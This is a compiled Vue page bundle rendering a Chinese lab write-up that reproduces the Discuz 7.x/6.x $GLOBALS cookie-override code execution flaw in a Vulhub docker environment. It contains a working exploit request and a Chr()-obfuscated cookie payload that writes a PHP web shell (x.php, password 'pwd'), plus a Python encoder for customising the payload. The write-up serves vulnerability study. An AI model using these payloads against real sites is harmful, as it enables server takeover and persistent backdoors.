import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as s,c as a,a as e,b as h,d as l,e as r}from"./app-58e4a7d6.js";const C={},c=r('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，也就是说默认配置下<code>$_REQUEST</code>只包含<code>$_GET</code>和<code>$_POST</code>而不包括$_COOKIE。</p><p>我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p>',4),o={href:"https://www.secpulse.com/archives/2338.html",target:"_blank",rel:"noopener noreferrer"},t=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Discuz 7.2：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动后，访问<code>http://your-ip:8080/install/</code>来安装discuz，数据库地址填写<code>db</code>，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221127521.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221129105.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import re
# ASCII = ord(Word)
# Word = chr(ASCII)

# ASCII -&gt; Word
def ASCII2word(ASCIIs):
	for c in re.findall(r&quot;(\\d+)&quot;, ASCIIs):
	    print(chr(int(c)),end=&quot;&quot;)

# Word -&gt; ASCII
def word2ASCII(words):
	ASCIIs = &quot;&quot;
	for word in words:
		ASCIIs += &quot;Chr(&quot; + str(ord(word)) + &quot;).&quot;
	print(ASCIIs)

print(&quot;----------ASCII TO WORD---------------------&quot;)

asciis = &quot;Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)&quot;
ASCII2word(asciis)

print(&quot;\\n\\n----------WORD TO ASCII--------------------&quot;)

words = &quot;fputs(fopen(&#39;x.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[pwd])?&gt;&#39;);&quot;
word2ASCII(words)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13);function u(v,p){const i=d("ExternalLinkIcon");return s(),a("div",null,[c,e("ul",null,[e("li",null,[e("a",o,[h("https://www.secpulse.com/archives/2338.html"),l(i)])])]),t])}const _=n(C,[["render",u],["__file","Discuz 7.x6.x 全局变量防御绕过导致代码执行.html.vue"]]);export{_ as default};
